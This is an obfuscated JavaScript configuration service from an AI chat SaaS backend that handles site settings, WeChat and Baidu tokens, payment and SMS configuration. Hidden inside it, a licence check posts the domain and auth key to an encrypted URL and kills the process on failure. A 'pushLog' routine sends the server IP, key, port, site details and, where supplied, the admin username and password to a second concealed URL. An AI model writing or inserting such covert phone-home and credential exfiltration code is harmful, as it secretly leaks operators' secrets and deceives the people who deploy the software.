'use strict';const _0x511fa9=_0x1775;(function(_0x81c213,_0x563b30){const _0x35c660=_0x1775,_0x493ab3=_0x81c213();while(!![]){try{const _0x950f46=parseInt(_0x35c660(0x218))/0x1*(parseInt(_0x35c660(0x1d8))/0x2)+parseInt(_0x35c660(0x1c0))/0x3*(-parseInt(_0x35c660(0x1c3))/0x4)+parseInt(_0x35c660(0x230))/0x5*(parseInt(_0x35c660(0x1b3))/0x6)+-parseInt(_0x35c660(0x1e4))/0x7+-parseInt(_0x35c660(0x198))/0x8+parseInt(_0x35c660(0x1c4))/0x9+parseInt(_0x35c660(0x22a))/0xa;if(_0x950f46===_0x563b30)break;else _0x493ab3['push'](_0x493ab3['shift']());}catch(_0x2188a2){_0x493ab3['push'](_0x493ab3['shift']());}}}(_0x49e6,0x259c5));var __decorate=this&&this[_0x511fa9(0x22b)]||function(_0x35cd77,_0x45477e,_0x3e0223,_0x14840d){const _0x4e0ce3=_0x511fa9;var _0x36305d=arguments[_0x4e0ce3(0x1a1)],_0x3830ea=_0x36305d<0x3?_0x45477e:_0x14840d===null?_0x14840d=Object[_0x4e0ce3(0x1ee)](_0x45477e,_0x3e0223):_0x14840d,_0x2a3f44;if(typeof Reflect==='object'&&typeof Reflect[_0x4e0ce3(0x202)]===_0x4e0ce3(0x1c6))_0x3830ea=Reflect[_0x4e0ce3(0x202)](_0x35cd77,_0x45477e,_0x3e0223,_0x14840d);else{for(var _0x3b6dc0=_0x35cd77['length']-0x1;_0x3b6dc0>=0x0;_0x3b6dc0--)if(_0x2a3f44=_0x35cd77[_0x3b6dc0])_0x3830ea=(_0x36305d<0x3?_0x2a3f44(_0x3830ea):_0x36305d>0x3?_0x2a3f44(_0x45477e,_0x3e0223,_0x3830ea):_0x2a3f44(_0x45477e,_0x3e0223))||_0x3830ea;}return _0x36305d>0x3&&_0x3830ea&&Object[_0x4e0ce3(0x206)](_0x45477e,_0x3e0223,_0x3830ea),_0x3830ea;},__metadata=this&&this[_0x511fa9(0x1ea)]||function(_0x239023,_0x33b751){const _0x5acf2e=_0x511fa9;if(typeof Reflect==='object'&&typeof Reflect[_0x5acf2e(0x231)]===_0x5acf2e(0x1c6))return Reflect[_0x5acf2e(0x231)](_0x239023,_0x33b751);},__param=this&&this[_0x511fa9(0x22d)]||function(_0x1998f5,_0xe81fec){return function(_0x2f7719,_0x27a29c){_0xe81fec(_0x2f7719,_0x27a29c,_0x1998f5);};};Object[_0x511fa9(0x206)](exports,_0x511fa9(0x1b6),{'value':!![]}),exports[_0x511fa9(0x1ef)]=void 0x0;const common_1=require('@nestjs/common'),config_entity_1=require(_0x511fa9(0x1e8)),typeorm_1=require(_0x511fa9(0x1c9)),typeorm_2=require(_0x511fa9(0x1ca)),utils_1=require(_0x511fa9(0x1ab)),axios_1=require(_0x511fa9(0x1eb)),actions_1=require(_0x511fa9(0x215)),store_1=require(_0x511fa9(0x1d0)),store_2=require(_0x511fa9(0x1d0)),AppConfig_1=require(_0x511fa9(0x23a)),vip_leavel_rel_entity_1=require(_0x511fa9(0x1f6)),nestjs_cls_1=require(_0x511fa9(0x243)),constant_1=require(_0x511fa9(0x1a7)),authCheckUrl=(0x0,utils_1[_0x511fa9(0x1e3)])('Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0ZDV7rlji6LO/S+cD95Ru8Q'),authLogUrl=(0x0,utils_1[_0x511fa9(0x1e3)])(_0x511fa9(0x1b8));let GlobalConfigService=class GlobalConfigService{constructor(_0x2c8ddd,_0x36a567,_0x3e818d){const _0x2502e8=_0x511fa9;this[_0x2502e8(0x1c1)]=_0x2c8ddd,this[_0x2502e8(0x1cb)]=_0x36a567,this[_0x2502e8(0x1f0)]=_0x3e818d,this[_0x2502e8(0x1ec)]=new Map(),this[_0x2502e8(0x1aa)]=new Map();}async['onModuleInit'](){const _0x1e67cc=_0x511fa9;await this['checkAiAuth'](),await this['pushLog'](),await this['initBaiduSensitive'](),await this['getWechatAccessToken'](!![]);const _0x4521e0=[][_0x1e67cc(0x19b)](store_1[_0x1e67cc(0x1bc)]['keys'],store_1[_0x1e67cc(0x1f9)]['keys'],store_2[_0x1e67cc(0x1bf)]['keys'],store_1[_0x1e67cc(0x240)][_0x1e67cc(0x1ed)],store_1[_0x1e67cc(0x1e9)]['keys'],store_1[_0x1e67cc(0x1a2)][_0x1e67cc(0x1ed)]),_0x48cd98=await this[_0x1e67cc(0x23d)](_0x4521e0);store_1[_0x1e67cc(0x1bc)][_0x1e67cc(0x1f4)](_0x48cd98),store_1['CZConfig']['refresh'](_0x48cd98),store_2[_0x1e67cc(0x1bf)][_0x1e67cc(0x1f4)](_0x48cd98),store_1[_0x1e67cc(0x240)][_0x1e67cc(0x1f4)](_0x48cd98),store_1['MusicConfig'][_0x1e67cc(0x1f4)](_0x48cd98),store_1['PPTConfig'][_0x1e67cc(0x1f4)](_0x48cd98);}async['checkAiAuth'](){const _0x48ae8e=_0x511fa9;if(process[_0x48ae8e(0x1a8)][_0x48ae8e(0x1ce)]===_0x48ae8e(0x203))return;const _0x462ba7=process[_0x48ae8e(0x1a8)][(0x0,utils_1['decrypt'])(_0x48ae8e(0x1ba))],_0x4aa2ea=process[_0x48ae8e(0x1a8)][(0x0,utils_1[_0x48ae8e(0x1e3)])('9kxwFUQptTaelrKStrwZQQ==')];(!_0x4aa2ea||!_0x462ba7)&&(common_1['Logger']['error']((0x0,utils_1[_0x48ae8e(0x1e3)])(_0x48ae8e(0x236))),(0x0,actions_1[_0x48ae8e(0x1dd)])());const _0x382b1b={'authDomain':_0x462ba7,'authKey':_0x4aa2ea},_0x307a85={'method':_0x48ae8e(0x20c),'headers':{'Content-Type':_0x48ae8e(0x1cf)},'body':JSON[_0x48ae8e(0x201)](_0x382b1b)},_0xb3760a=await fetch(authCheckUrl,_0x307a85)[_0x48ae8e(0x248)](_0x1c04a2=>{const _0x474fdf=_0x48ae8e;return _0x1c04a2[_0x474fdf(0x1a9)]();})[_0x48ae8e(0x222)](_0x5ec1a4=>{common_1['Logger']['error'](_0x5ec1a4,'global');});_0xb3760a[_0x48ae8e(0x1f1)]!==0x0&&(common_1[_0x48ae8e(0x1f5)]['error']((0x0,utils_1[_0x48ae8e(0x1e3)])('bkYMP1mVCBurarEsc48hu4lD0nfoPfj1FccGPRuygRtgPnbJWkkvJGU6zhr/otMF6E7iBQk6kY90kyEI47sVTA==')),(0x0,actions_1[_0x48ae8e(0x1dd)])()),_0xb3760a?.[_0x48ae8e(0x1f1)]===0x0&&!_0xb3760a?.[_0x48ae8e(0x1c2)]?.[_0x48ae8e(0x228)]&&(common_1[_0x48ae8e(0x1f5)][_0x48ae8e(0x19e)]((0x0,utils_1[_0x48ae8e(0x1e3)])(_0x48ae8e(0x236))),(0x0,actions_1[_0x48ae8e(0x1dd)])());}async[_0x511fa9(0x217)](_0x292416,_0x1b09bf){const _0x532210=_0x511fa9,_0x2be4dd=process['env'][(0x0,utils_1[_0x532210(0x1e3)])(_0x532210(0x1ba))],_0x2b7bb3=process[_0x532210(0x1a8)][(0x0,utils_1[_0x532210(0x1e3)])(_0x532210(0x1e5))],_0x584fd9=process[_0x532210(0x1a8)][_0x532210(0x211)];if(!_0x2be4dd||!_0x2b7bb3)throw new common_1[(_0x532210(0x1a5))]((0x0,utils_1['decrypt'])(_0x532210(0x236)),common_1[_0x532210(0x1b2)][_0x532210(0x19f)]);const {qqNumber:_0x52046a,vxNumber:_0x14fe24,siteName:_0x283b8a,domain:_0x55c133,registerBaseUrl:_0x5c28b9}=await this[_0x532210(0x23d)]([_0x532210(0x1a6),_0x532210(0x23e),_0x532210(0x199),'domain','registerBaseUrl']),_0x19359b={'ip':_0x2be4dd,'key':_0x2b7bb3,'port':_0x584fd9,'qqNumber':_0x52046a,'vxNumber':_0x14fe24,'domain':_0x55c133,'adminAccount':_0x292416,'adminPass':_0x1b09bf,'baseUrl':_0x5c28b9,'siteName':_0x283b8a,'qq':_0x52046a,'vxNum':_0x14fe24,'version':AppConfig_1[_0x532210(0x1d1)]},_0x1e4969={'method':_0x532210(0x20c),'headers':{'Content-Type':_0x532210(0x1cf)},'body':JSON[_0x532210(0x201)](_0x19359b)};await fetch(authLogUrl,_0x1e4969)[_0x532210(0x222)](_0x46cbca=>{const _0x57cf01=_0x532210;console[_0x57cf01(0x20e)](_0x57cf01(0x204),_0x46cbca);});}async['initBaiduSensitive'](_0x127652=!![]){const _0x1fae50=_0x511fa9,{baiduTextApiKey:_0x43f85d,baiduTextSecretKey:_0x394121}=await this[_0x1fae50(0x23d)]([_0x1fae50(0x1fa),_0x1fae50(0x223)]);if(!_0x43f85d||!_0x394121){common_1[_0x1fae50(0x1f5)]['error'](_0x1fae50(0x1b5),_0x1fae50(0x1ef));return;}const _0x525532={'Content-Type':_0x1fae50(0x1cf),'Accept':'application/json'},_0x2369ad=_0x1fae50(0x1d5)+_0x43f85d+_0x1fae50(0x205)+_0x394121+_0x1fae50(0x239);try{const _0x353956=await axios_1[_0x1fae50(0x1af)]['post'](_0x2369ad,{'headers':_0x525532});this[_0x1fae50(0x216)]=_0x353956[_0x1fae50(0x1c2)][_0x1fae50(0x249)];}catch(_0xcb4687){if(_0x127652)common_1[_0x1fae50(0x1f5)][_0x1fae50(0x19e)](_0x1fae50(0x1d9),_0x1fae50(0x1ef));else throw new common_1[(_0x1fae50(0x1a5))](_0xcb4687[_0x1fae50(0x1db)][_0x1fae50(0x1c2)][_0x1fae50(0x1df)],common_1[_0x1fae50(0x1b2)][_0x1fae50(0x209)]);}}async['getWechatAccessToken'](_0x392212=![]){const _0xc91747=_0x511fa9,_0x4e0860=new Map(),_0x3ee000=await this[_0xc91747(0x1c1)][_0xc91747(0x20d)]({'where':{'configKey':(0x0,typeorm_2['In'])([_0xc91747(0x1fe),_0xc91747(0x20b)])}});_0x3ee000[_0xc91747(0x212)](_0x440d50=>{const _0xd9317c=_0xc91747;!_0x4e0860[_0xd9317c(0x1b0)](_0x440d50[_0xd9317c(0x1ff)])&&_0x4e0860[_0xd9317c(0x21c)](_0x440d50['saasId'],{}),_0x4e0860[_0xd9317c(0x210)](_0x440d50['saasId'])[_0x440d50[_0xd9317c(0x1b4)]]=_0x440d50[_0xd9317c(0x225)];}),_0x4e0860[_0xc91747(0x212)]((_0x3eecb3,_0xda0382)=>{const _0x2eb674=_0xc91747;!_0x3eecb3['wechatOfficialAppId']||!_0x3eecb3[_0x2eb674(0x20b)]?common_1['Logger'][_0x2eb674(0x1d2)]('saas\x20'+_0xda0382+_0x2eb674(0x233),_0x2eb674(0x246)):this['fetchBaseAccessToken'](_0xda0382,_0x3eecb3[_0x2eb674(0x1fe)],_0x3eecb3[_0x2eb674(0x20b)],_0x392212);}),common_1[_0xc91747(0x1f5)]['log'](_0xc91747(0x1da),_0xc91747(0x227));}async[_0x511fa9(0x1ad)](_0x3b8ea8,_0x287f45,_0x54e991,_0x4a1035=![]){const _0x21d85e=_0x511fa9;if(process[_0x21d85e(0x1a8)]['ISDEV']===_0x21d85e(0x23c))return;try{let _0x34d7de='';const _0x1aeb65=process[_0x21d85e(0x1a8)][_0x21d85e(0x1c5)];if(_0x1aeb65===_0x21d85e(0x23f)||_0x1aeb65==='ceshi.qumao518.vip'||_0x1aeb65===_0x21d85e(0x234)){const _0x3c37cd=await axios_1[_0x21d85e(0x1af)]['get']('https://gomaxai.qumao518.vip/api/official/getAccessToken?type=official');_0x34d7de=_0x3c37cd[_0x21d85e(0x1c2)][_0x21d85e(0x1c2)];}else{const _0x464a27=await axios_1[_0x21d85e(0x1af)]['get'](_0x21d85e(0x21b)+_0x287f45+_0x21d85e(0x21e)+_0x54e991);if(_0x464a27[_0x21d85e(0x1c2)][_0x21d85e(0x1e0)])throw new Error(_0x21d85e(0x21f)+_0x464a27[_0x21d85e(0x1c2)][_0x21d85e(0x1e0)]);_0x34d7de=_0x464a27[_0x21d85e(0x1c2)][_0x21d85e(0x249)];}this[_0x21d85e(0x1ec)]['set'](_0x3b8ea8,_0x34d7de);const _0x1d7f4b=await axios_1[_0x21d85e(0x1af)][_0x21d85e(0x210)]('https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token='+_0x34d7de+'&type=jsapi');this[_0x21d85e(0x1aa)]['set'](_0x3b8ea8,_0x1d7f4b?.[_0x21d85e(0x1c2)]?.[_0x21d85e(0x237)]);}catch(_0xb241ae){common_1[_0x21d85e(0x1f5)][_0x21d85e(0x19e)](_0xb241ae[_0x21d85e(0x232)],'fetchBaseAccessToken');}}async[_0x511fa9(0x1e7)](_0x1a5567){const _0x31dbbc=_0x511fa9;if(process['env']['SAAS'])return!![];const {domain:_0x546170}=_0x1a5567,_0x55e8d5=process[_0x31dbbc(0x1a8)][(0x0,utils_1[_0x31dbbc(0x1e3)])(_0x31dbbc(0x1ba))];return _0x546170[_0x31dbbc(0x23b)](_0x55e8d5);}async['createOrUpdate'](_0x501ce7){const _0x4bef6a=_0x511fa9;try{const _0x117673=this['cls'][_0x4bef6a(0x210)](_0x4bef6a(0x1ff)),{configKey:_0x19fb63,configVal:_0xde7ddf,status:status=0x1}=_0x501ce7,_0xd99c0d=await this[_0x4bef6a(0x1c1)][_0x4bef6a(0x1ac)]({'where':{'configKey':_0x19fb63,'saasId':_0x117673}});typeof _0xde7ddf===_0x4bef6a(0x1bd)?_0xd99c0d?await this['configEntity'][_0x4bef6a(0x1f2)]({'configKey':_0x19fb63,'saasId':_0x117673},{'configJsonVal':_0xde7ddf,'status':status}):await this[_0x4bef6a(0x1c1)][_0x4bef6a(0x1cc)]({'configKey':_0x19fb63,'configJsonVal':_0xde7ddf,'status':status,'saasId':_0x117673}):_0xd99c0d?await this[_0x4bef6a(0x1c1)]['update']({'configKey':_0x19fb63,'saasId':_0x117673},{'configVal':_0xde7ddf,'status':status}):await this[_0x4bef6a(0x1c1)][_0x4bef6a(0x1cc)]({'configKey':_0x19fb63,'configVal':_0xde7ddf,'status':status,'saasId':_0x117673});}catch(_0xb979be){throw new common_1[(_0x4bef6a(0x1a5))](_0x4bef6a(0x1cd),common_1[_0x4bef6a(0x1b2)][_0x4bef6a(0x209)]);}}async[_0x511fa9(0x1e6)](_0x4ec0ab){const _0x189787=_0x511fa9;let _0xfed408=![],_0x4a114f=![],_0x149c2a=![],_0x2d7849=![],_0x24d431=![],_0x4ccb19=![],_0x451063=![];const _0x928a16={},{settings:_0x3ee06f}=_0x4ec0ab;for(const _0x46c95d of _0x3ee06f){await this[_0x189787(0x22f)](_0x46c95d),_0x928a16[_0x46c95d[_0x189787(0x1b4)]]=_0x46c95d[_0x189787(0x225)],store_1['MjConfig'][_0x46c95d[_0x189787(0x1b4)]]&&(_0xfed408=!![]),store_1['CZConfig'][_0x46c95d[_0x189787(0x1b4)]]&&(_0x4a114f=!![]),store_2['WechatConfig'][_0x46c95d[_0x189787(0x1b4)]]&&(_0x149c2a=!![]),store_1[_0x189787(0x240)][_0x46c95d[_0x189787(0x1b4)]]&&(_0x451063=!![]),['baiduTextApiKey','baiduTextSecretKey'][_0x189787(0x23b)](_0x46c95d[_0x189787(0x1b4)])&&(_0x2d7849=!![]),['wechatOfficialAppId',_0x189787(0x20b)][_0x189787(0x23b)](_0x46c95d[_0x189787(0x1b4)])&&(_0x24d431=!![]),[_0x189787(0x1a6),_0x189787(0x23e),_0x189787(0x199),'domain','registerBaseUrl'][_0x189787(0x23b)](_0x46c95d[_0x189787(0x1b4)])&&(_0x4ccb19=!![]);}return _0xfed408&&store_1[_0x189787(0x1bc)][_0x189787(0x1f4)](_0x928a16),_0x4a114f&&store_1[_0x189787(0x1f9)][_0x189787(0x1f4)](_0x928a16),_0x149c2a&&store_2[_0x189787(0x1bf)][_0x189787(0x1f4)](_0x928a16),_0x451063&&store_1['LinkFoxConfig'][_0x189787(0x1f4)](_0x928a16),_0x2d7849&&await this[_0x189787(0x1a0)](![]),_0x24d431&&await this[_0x189787(0x246)](),_0x4ccb19&&this[_0x189787(0x217)](),'设置完成！';}async[_0x511fa9(0x1e2)](_0x28a75f){const _0xe9c4fa=_0x511fa9,_0x345851=await this[_0xe9c4fa(0x23d)](_0x28a75f,!![]);return _0x28a75f[_0xe9c4fa(0x1a1)]===0x1?_0x345851[_0x28a75f[0x0]]:_0x345851;}async['getConfigByKeys'](_0x5e1fa9,_0x2d4a80=![]){const _0x101181=_0x511fa9;if(!_0x5e1fa9[_0x101181(0x1a1)])throw new Error(_0x101181(0x1d3));const _0x42a646=this[_0x101181(0x1f0)]['get'](_0x101181(0x1ff))||0x0,_0x2286b4=new Map(),_0x401d60=await this[_0x101181(0x1c1)]['find']({'where':{'configKey':(0x0,typeorm_2['In'])(_0x5e1fa9),'saasId':(0x0,typeorm_2['In'])([0x0,_0x42a646])}});_0x401d60[_0x101181(0x212)](_0x18a578=>{const {configKey:_0x19f07e,configVal:_0x3b91bb,configJsonVal:_0x7146e1,saasId:_0x4710d5}=_0x18a578;_0x2286b4['set'](_0x19f07e+'-'+_0x4710d5,_0x7146e1||_0x3b91bb);}),this[_0x101181(0x1ec)][_0x101181(0x212)]((_0x103f17,_0x2521c8)=>{const _0x2e0b58=_0x101181;_0x2286b4[_0x2e0b58(0x21c)]('wechatAccessToken-'+_0x2521c8,_0x103f17);}),this[_0x101181(0x1aa)][_0x101181(0x212)]((_0x5b5f5e,_0x19fdc2)=>{const _0x5dd207=_0x101181;_0x2286b4[_0x5dd207(0x21c)](_0x5dd207(0x226)+_0x19fdc2,_0x5b5f5e);}),_0x2286b4[_0x101181(0x21c)](_0x101181(0x20a),this[_0x101181(0x216)]);const _0x2da606={};_0x5e1fa9[_0x101181(0x212)](_0x5024e8=>{const _0x33b460=_0x101181;let _0x68b61b=_0x5024e8+'-'+_0x42a646,_0xb7a5c0='';_0x2286b4[_0x33b460(0x1b0)](_0x68b61b)?_0xb7a5c0=_0x2286b4[_0x33b460(0x210)](_0x68b61b):!constant_1[_0x33b460(0x1d7)]['includes'](_0x5024e8)&&(_0xb7a5c0=_0x2286b4[_0x33b460(0x210)](_0x5024e8+'-'+0x0)),_0x2da606[_0x5024e8]=_0xb7a5c0;});if(_0x2d4a80)return _0x2da606;return _0x5e1fa9[_0x101181(0x1a1)]===0x1?_0x2da606[_0x5e1fa9[0x0]]:_0x2da606;}async[_0x511fa9(0x247)](){const _0x57f6e1=_0x511fa9,_0xbf7118=await this[_0x57f6e1(0x23d)](constant_1[_0x57f6e1(0x221)]);return{..._0xbf7118,'isUseWxLogin':!!(_0xbf7118[_0x57f6e1(0x1fe)]&&_0xbf7118['wechatOfficialAppSecret'])};}async[_0x511fa9(0x1fd)](_0x2fa5be=_0x511fa9(0x241)){const _0x5dd02d=_0x511fa9,{payHupiStatus:payHupiStatus=0x0,payEpayStatus:payEpayStatus=0x0,payWechatStatus:payWechatStatus=0x0,payMpayStatus:payMpayStatus=0x0}=await this[_0x5dd02d(0x23d)]([_0x5dd02d(0x19a),_0x5dd02d(0x1c7),_0x5dd02d(0x213),_0x5dd02d(0x19d)]);if([payHupiStatus,payEpayStatus,payWechatStatus,payMpayStatus][_0x5dd02d(0x1fb)](_0x44a6f3=>_0x44a6f3===0x0))throw new common_1[(_0x5dd02d(0x1a5))](_0x5dd02d(0x1f3),common_1[_0x5dd02d(0x1b2)]['BAD_REQUEST']);if(Number(payWechatStatus)===0x1)return _0x2fa5be;if(Number(payEpayStatus)===0x1)return _0x5dd02d(0x1d6);if(Number(payMpayStatus)===0x1)return _0x5dd02d(0x1a4);if(Number(payHupiStatus)===0x1)return _0x5dd02d(0x245);}async[_0x511fa9(0x235)](){const _0x3d32a8=_0x511fa9,{phoneRegisterStatus:_0x1368c9,aliPhoneAccessKeyId:_0x3d153a,aliPhoneAccessKeySecret:_0x5d9264,aliPhoneSignName:_0x1a0f56,aliPhoneTemplateCode:_0x20e007}=await this[_0x3d32a8(0x23d)]([_0x3d32a8(0x219),_0x3d32a8(0x1b9),_0x3d32a8(0x20f),_0x3d32a8(0x238),_0x3d32a8(0x220)]);if(Number(_0x1368c9)!==0x1)throw new common_1['HttpException'](_0x3d32a8(0x19c),common_1[_0x3d32a8(0x1b2)][_0x3d32a8(0x209)]);return{'accessKeyId':_0x3d153a,'accessKeySecret':_0x5d9264,'SignName':_0x1a0f56,'TemplateCode':_0x20e007};}['getNamespace'](){const _0x13884e=_0x511fa9;return process[_0x13884e(0x1a8)][_0x13884e(0x244)]||_0x13884e(0x1fc);}async[_0x511fa9(0x1b1)](){const _0x1bc3f4=_0x511fa9,_0x446dca=await this['getConfigByKeys']([_0x1bc3f4(0x1c8),_0x1bc3f4(0x1e1)]),_0x207e3f={};for(let _0x33c141 in _0x446dca){const _0x2c5a72=Number(_0x446dca[_0x33c141]);_0x207e3f[_0x33c141]=isNaN(_0x2c5a72)?0x0:_0x2c5a72;}if(!_0x207e3f[_0x1bc3f4(0x1c8)])throw new common_1['HttpException'](_0x1bc3f4(0x22e),common_1['HttpStatus']['BAD_REQUEST']);return _0x207e3f[_0x1bc3f4(0x1e1)];}async['getSensitiveConfig'](){const _0x1bd058=_0x511fa9,{baiduTextStatus:baiduTextStatus=0x0,baiduTextAccessToken:_0x2a619a,nineaiBuiltInSensitiveStatus:nineaiBuiltInSensitiveStatus=0x0,nineaiBuiltInSensitiveApiBase:_0x3b210e,nineaiBuiltInSensitiveAuthKey:_0x5374cc}=await this['getConfigByKeys']([_0x1bd058(0x1a3),_0x1bd058(0x216),_0x1bd058(0x21d),_0x1bd058(0x200),'nineaiBuiltInSensitiveAuthKey']);if(Number(baiduTextStatus)===0x1)return{'useType':'baidu','baiduTextAccessToken':_0x2a619a};if(Number(nineaiBuiltInSensitiveStatus)===0x1)return{'useType':_0x1bd058(0x1b7),'nineaiBuiltInSensitiveApiBase':_0x3b210e,'nineaiBuiltInSensitiveAuthKey':_0x5374cc};return null;}async[_0x511fa9(0x1ae)](){const _0x2fba56=_0x511fa9,_0x2fec59=await this[_0x2fba56(0x23d)](['robotAvatar']);if(!_0x2fec59)throw new common_1[(_0x2fba56(0x1a5))](_0x2fba56(0x242),common_1[_0x2fba56(0x1b2)]['BAD_GATEWAY']);const _0x4a3ff9=await axios_1[_0x2fba56(0x1af)][_0x2fba56(0x210)](_0x2fec59,{'responseType':_0x2fba56(0x207)}),_0x44ef8a=Buffer[_0x2fba56(0x22c)](_0x4a3ff9['data'])[_0x2fba56(0x214)](_0x2fba56(0x1de));return _0x2fba56(0x1f8)+_0x44ef8a;}async[_0x511fa9(0x1d4)](_0x1fb1bc){const _0x41f59c=_0x511fa9;await this[_0x41f59c(0x1cb)][_0x41f59c(0x1cc)](_0x1fb1bc);}async[_0x511fa9(0x21a)](_0x228336,_0x5614cb,_0x209392){const _0x2841c8=_0x511fa9,_0x1f6b91={'vipLeavelId':_0x228336,'relateType':_0x5614cb};_0x209392&&(_0x1f6b91[_0x2841c8(0x208)]=_0x209392);const _0x2e5f13=await this[_0x2841c8(0x1cb)]['findOne']({'where':_0x1f6b91});return _0x2e5f13;}};function _0x1775(_0xeaab88,_0x1cb4ac){const _0x49e6c0=_0x49e6();return _0x1775=function(_0x177563,_0x4af32b){_0x177563=_0x177563-0x198;let _0xae4fc7=_0x49e6c0[_0x177563];return _0xae4fc7;},_0x1775(_0xeaab88,_0x1cb4ac);}GlobalConfigService=__decorate([(0x0,common_1[_0x511fa9(0x1bb)])(),__param(0x0,(0x0,typeorm_1[_0x511fa9(0x1dc)])(config_entity_1[_0x511fa9(0x229)])),__param(0x1,(0x0,typeorm_1[_0x511fa9(0x1dc)])(vip_leavel_rel_entity_1['VipLeavelRelEntity'])),__metadata(_0x511fa9(0x1be),[typeorm_2[_0x511fa9(0x224)],typeorm_2['Repository'],nestjs_cls_1[_0x511fa9(0x1f7)]])],GlobalConfigService),exports[_0x511fa9(0x1ef)]=GlobalConfigService;function _0x49e6(){const _0x26dc76=['application/json','../../common/store','APP_VERSION','warn','查询配置不能为空！','saveVipLeavelRel','https://aip.baidubce.com/oauth/2.0/token?client_id=','epay','SelfKeys','22BGitlA','百度敏感词配置检测失败，您的参数可能配置的不正确!','wechat\x20get\x20access_token\x20done','response','InjectRepository','exit','base64','error_description','errmsg','signInRewards','getConfigs4Front','decrypt','383607DlaYUi','9kxwFUQptTaelrKStrwZQQ==','setConfig','checkDomain','./config.entity','PPTConfig','__metadata','axios','wechatAccessTokenMap','keys','getOwnPropertyDescriptor','GlobalConfigService','cls','code','update','支付功能暂未开放!','refresh','Logger','./vip_leavel_rel.entity','ClsService','data:image/jpeg;base64,','CZConfig','baiduTextApiKey','every','GOMAXAI','queryPayType','wechatOfficialAppId','saasId','nineaiBuiltInSensitiveApiBase','stringify','decorate','development','push\x20log\x20error','&client_secret=','defineProperty','arraybuffer','relateId','BAD_REQUEST','baiduTextAccessToken-0','wechatOfficialAppSecret','POST','find','log','aliPhoneAccessKeySecret','get','PORT','forEach','payMpayStatus','toString','@nestjs/cli/actions','baiduTextAccessToken','pushLog','7037aolhup','phoneRegisterStatus','getVipLeavelRelById','https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=','set','nineaiBuiltInSensitiveStatus','&secret=','获取微信access_token失败、错误信息：','aliPhoneTemplateCode','FrontKeys','catch','baiduTextSecretKey','Repository','configVal','wechatJsapiTicket-','OfficialService','check','ConfigEntity','4064790jWHTjp','__decorate','from','__param','签到功能暂未开放!','createOrUpdate','95MWOEfp','metadata','message','\x20微信配置缺失，不可使用微信登录！','saas.qumao518.vip','getPhoneVerifyConfig','nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5','ticket','aliPhoneSignName','&grant_type=client_credentials','../../config/AppConfig','includes','TRUE','getConfigByKeys','vxNumber','kaifa.qumao518.vip','LinkFoxConfig','wechat','未配置\x20robotAvatar.','nestjs-cls','NAMESPACE','hupi','getWechatAccessToken','queryFrontConfig','then','access_token','2463984XwNtJG','siteName','payHupiStatus','concat','手机验证码功能暂未开放!','payWechatStatus','error','UNAUTHORIZED','initBaiduSensitive','length','MusicConfig','baiduTextStatus','mpay','HttpException','qqNumber','./constant','env','json','wechatJsapiTicketMap','../../common/utils','findOne','fetchBaseAccessToken','robotAvatar2Base64','default','has','getSignatureGiftConfig','HttpStatus','4836yqIEgh','configKey','百度敏感词初始化失败，如果需要敏感检测、请前往后台系统配置!','__esModule','nineai','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0bno5L8H6T5QXXNUvLB6d1U','aliPhoneAccessKeyId','JPFq8fAlQE2V2Eq7KWYSxg==','Injectable','MjConfig','object','design:paramtypes','WechatConfig','11064cNMLbo','configEntity','data','184IDezLC','1685700aGURhD','GOMAXAI_HOST','function','payEpayStatus','signInStatus','@nestjs/typeorm','typeorm','vipLeavelRelEntity','save','设置配置信息错误！','ENV'];_0x49e6=function(){return _0x26dc76;};return _0x49e6();}